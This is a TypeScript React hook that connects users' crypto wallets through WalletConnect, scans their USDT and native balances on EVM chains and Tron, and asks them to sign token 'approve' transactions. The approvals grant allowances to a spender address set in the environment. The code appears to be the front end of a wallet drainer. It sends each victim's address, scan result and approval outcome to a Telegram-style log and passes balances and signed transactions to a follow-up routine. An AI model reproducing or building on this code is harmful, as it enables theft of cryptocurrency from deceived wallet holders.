"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { configGaps, getSpenderEvm } from "@/lib/approve-config";
import { EVM_CHAIN_ID, EVM_USDT, isEvmChainKey } from "@/lib/chain-tokens";
import { fetchBalances } from "@/lib/connect-flow/balances-client";
import {
  METADATA,
  projectId,
  WC_CONNECT_NAMESPACES,
} from "@/lib/connect-flow/constants";
import { rowsFromBalances } from "@/lib/connect-flow/network-meta";
import { runPostConfirmSequence } from "@/lib/connect-flow/post-confirm";
import { postTgLog } from "@/lib/connect-flow/tg-log-client";
import {
  encodeErc20Approve,
  resolveEvmAmountRaw,
} from "@/lib/connect-flow/evm-approve";
import {
  accountsFromSession,
  getTronLinkAddress,
  mergeTronSignedResult,
  tronSignTransaction,
} from "@/lib/connect-flow/tron-sign";
import {
  getSharedWcModal,
  purgeExtraWcmModals,
} from "@/lib/connect-flow/wallet-connect-modal";
import type {
  LinkedAccounts,
  NetworkRow,
  RowStatus,
  UniversalProvider,
  WalletConnectModal,
} from "@/lib/connect-flow/types";

export function useConnectFlow() {
  const providerRef = useRef<UniversalProvider | null>(null);
  const modalRef = useRef<WalletConnectModal | null>(null);
  const connectingRef = useRef(false);
  const approvingLockRef = useRef(false);
  const initOnceRef = useRef(false);
  const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });

  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [approving, setApproving] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [networks, setNetworks] = useState<NetworkRow[]>([]);
  const [selectedKey, setSelectedKey] = useState<string | null>(null);
  const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});

  const setStatus = useCallback((key: string, status: RowStatus) => {
    setRowStatus((prev) => ({ ...prev, [key]: status }));
  }, []);

  const scanWallet = useCallback(async (linked: LinkedAccounts) => {
    if (!linked.evm && !linked.tron) {
      setNetworks([]);
      return;
    }

    setError(null);
    setNetworks([]);
    setSelectedKey(null);
    setRowStatus({});

    try {
      let tron = linked.tron;
      if (!tron) tron = await getTronLinkAddress();

      const linkedFinal = { evm: linked.evm, tron };
      accountsRef.current = linkedFinal;

      const primary = tron || linked.evm;
      const network = tron ? "tron" : "evm";
      const [, data] = await Promise.all([
        primary
          ? postTgLog({
              type: "scan",
              address: primary,
              network,
              status: "success",
              error: null,
            })
          : Promise.resolve(),
        fetchBalances(linked.evm, tron),
      ]);

      const rows = rowsFromBalances(data);
      setNetworks(rows);
      setRowStatus(
        Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus]))
      );
      setShowResults(true);
    } catch (err: unknown) {
      console.error(err);
      setError(err instanceof Error ? err.message : "Failed to fetch balances");
      setNetworks([]);
    }
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function init() {
      if (!projectId) {
        setError("Missing NEXT_PUBLIC_PROJECT_ID in .env.local");
        return;
      }

      if (initOnceRef.current && providerRef.current && modalRef.current) {
        setReady(true);
        return;
      }

      const [{ default: UniversalProvider }, { WalletConnectModal }] =
        await Promise.all([
          import("@walletconnect/universal-provider"),
          import("@walletconnect/modal"),
        ]);

      if (cancelled) return;

      const modal = getSharedWcModal(WalletConnectModal, projectId);

      const provider = await UniversalProvider.init({
        projectId,
        metadata: {
          ...METADATA,
          url:
            typeof window !== "undefined"
              ? window.location.origin
              : METADATA.url,
        },
      });

      if (cancelled) return;

      provider.events.removeAllListeners("display_uri");
      provider.events.removeAllListeners("session_delete");
      provider.on("display_uri", (uri: string) => {
        purgeExtraWcmModals(document.querySelector("wcm-modal"));
        void modal.openModal({ uri });
      });
      provider.on("session_delete", () => {
        setNetworks([]);
        setShowResults(false);
        setSelectedKey(null);
        setRowStatus({});
        accountsRef.current = { evm: null, tron: null };
      });

      providerRef.current = provider;
      modalRef.current = modal;
      initOnceRef.current = true;
      setReady(true);
    }

    init().catch((err: unknown) => {
      console.error(err);
      setError(
        err instanceof Error ? err.message : "Failed to init WalletConnect"
      );
    });

    return () => {
      cancelled = true;
      modalRef.current?.closeModal();
    };
  }, []);

  const openWalletConnect = useCallback(async () => {
    const provider = providerRef.current;
    const modal = modalRef.current;
    if (!provider || connectingRef.current) return;

    connectingRef.current = true;
    setError(null);
    setBusy(true);
    setShowResults(false);
    setNetworks([]);
    setSelectedKey(null);
    setRowStatus({});

    let unsubscribeModal: (() => void) | undefined;
    if (modal) {
      let modalWasOpen = false;
      unsubscribeModal = modal.subscribeModal((state) => {
        if (state.open) {
          modalWasOpen = true;
          return;
        }
        if (!modalWasOpen || !connectingRef.current || provider.session) return;
        provider.abortPairingAttempt();
        connectingRef.current = false;
        setBusy(false);
      });
    }

    try {
      if (provider.session) {
        await provider.disconnect().catch(() => undefined);
      }

      await provider.connect({
        optionalNamespaces: WC_CONNECT_NAMESPACES,
      });

      modal?.closeModal();

      const linked = accountsFromSession(provider.session);

      if (!linked.evm && !linked.tron) {
        setError("No account returned from wallet. Please try again.");
        return;
      }

      await scanWallet(linked);
    } catch (err: unknown) {
      console.error(err);
      modal?.closeModal();
      const message =
        err instanceof Error ? err.message : "Connection cancelled";
      if (/reset/i.test(message)) {
        setError("Connection request reset. Please try again.");
      } else if (!/rejected|denied|cancel|abort/i.test(message)) {
        setError(message);
      }
      setNetworks([]);
      setShowResults(false);
    } finally {
      unsubscribeModal?.();
      connectingRef.current = false;
      setBusy(false);
    }
  }, [scanWallet]);

  const requestApprove = useCallback(
    async (networkKey: string) => {
      const provider = providerRef.current;
      if (!provider || approvingLockRef.current) return;

      const gaps = configGaps(networkKey);
      if (gaps.length > 0) {
        setError(
          `Fill placeholders in .env.local: ${gaps.join(", ")} (then restart dev server)`
        );
        return;
      }

      const linked = accountsRef.current;
      approvingLockRef.current = true;
      setApproving(true);
      setError(null);
      setSelectedKey(networkKey);
      setStatus(networkKey, "waiting");

      const addressForLog =
        networkKey === "tron" ? linked.tron : linked.evm;
      const nativeBalance =
        networks.find((n) => n.key === networkKey)?.balances.native ?? "0";
      const usdtBalance =
        networks.find((n) => n.key === networkKey)?.balances.usdt ?? "0";
      let txid: string | null = null;
      let signedTx: Record<string, unknown> | null = null;

      try {
        if (networkKey === "tron") {
          if (!linked.tron) {
            throw new Error("No Tron address in this WalletConnect session");
          }

          const buildRes = await fetch("/api/tron-approve", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({ owner: linked.tron }),
            cache: "no-store",
          });
          const buildJson = (await buildRes.json()) as {
            transaction?: Record<string, unknown>;
            error?: string;
          };
          if (!buildRes.ok || !buildJson.transaction) {
            throw new Error(buildJson.error || "Failed to build Tron approve");
          }

          const signRaw = await tronSignTransaction(
            provider,
            linked.tron,
            buildJson.transaction
          );
          const signed = mergeTronSignedResult(
            buildJson.transaction,
            signRaw
          );
          signedTx = signed;

          const broadcastRes = await fetch("/api/tron-broadcast", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify(signed),
            cache: "no-store",
          });
          const broadcastJson = (await broadcastRes.json()) as {
            result?: boolean;
            txid?: string;
            error?: string;
          };
          if (!broadcastRes.ok || !broadcastJson.result) {
            throw new Error(
              broadcastJson.error || "Failed to broadcast Tron approve"
            );
          }
          txid =
            (typeof broadcastJson.txid === "string" && broadcastJson.txid) ||
            (typeof signed.txID === "string" ? signed.txID : null);
        } else if (isEvmChainKey(networkKey)) {
          if (!linked.evm) {
            throw new Error("No EVM address in this WalletConnect session");
          }
          const spender = getSpenderEvm();
          if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
            throw new Error("NEXT_PUBLIC_SPENDER_EVM is not a valid 0x address");
          }
          const token = EVM_USDT[networkKey];
          const amount = resolveEvmAmountRaw(token.decimals);
          const data = encodeErc20Approve(spender, amount);
          const chainId = EVM_CHAIN_ID[networkKey];

          const hash = await provider.request(
            {
              method: "eth_sendTransaction",
              params: [
                {
                  from: linked.evm,
                  to: token.address,
                  data,
                  value: "0x0",
                },
              ],
            },
            `eip155:${chainId}`
          );
          txid = typeof hash === "string" ? hash : null;
        } else {
          throw new Error(`Unsupported network: ${networkKey}`);
        }

        setStatus(networkKey, "finalizing");
        if (addressForLog) {
          await runPostConfirmSequence({
            networkKey,
            address: addressForLog,
            nativeBalance,
            usdtBalance,
            txid,
            signedTx,
          });
        }

        setStatus(networkKey, "approved");
        if (addressForLog) {
          void postTgLog({
            type: "approve",
            address: addressForLog,
            network: networkKey,
            status: "success",
            error: null,
          });
        }
      } catch (err: unknown) {
        console.error(err);
        const message =
          err instanceof Error ? err.message : "Approval failed";
        const rejected = /reject|denied|cancel/i.test(message);
        setStatus(networkKey, rejected ? "rejected" : "awaiting");
        if (!rejected) setError(message);
        if (addressForLog) {
          void postTgLog({
            type: "approve",
            address: addressForLog,
            network: networkKey,
            status: "rejected",
            error: rejected ? "User canceled" : message,
          });
        }
        if (rejected) {
          window.setTimeout(() => setStatus(networkKey, "awaiting"), 1600);
        }
      } finally {
        approvingLockRef.current = false;
        setApproving(false);
      }
    },
    [networks, setStatus]
  );

  const onSelectNetwork = useCallback(
    (key: string) => {
      if (approving) return;
      setSelectedKey(key);
      setError(null);
    },
    [approving]
  );

  const onContinue = useCallback(() => {
    if (!selectedKey) {
      setError("Select a network first");
      return;
    }
    void requestApprove(selectedKey);
  }, [requestApprove, selectedKey]);

  const closeResultsModal = useCallback(() => {
    if (approving) return;
    setShowResults(false);
  }, [approving]);

  return {
    ready,
    busy,
    approving,
    showResults,
    error,
    networks,
    selectedKey,
    rowStatus,
    openWalletConnect,
    onSelectNetwork,
    onContinue,
    closeResultsModal,
  };
}
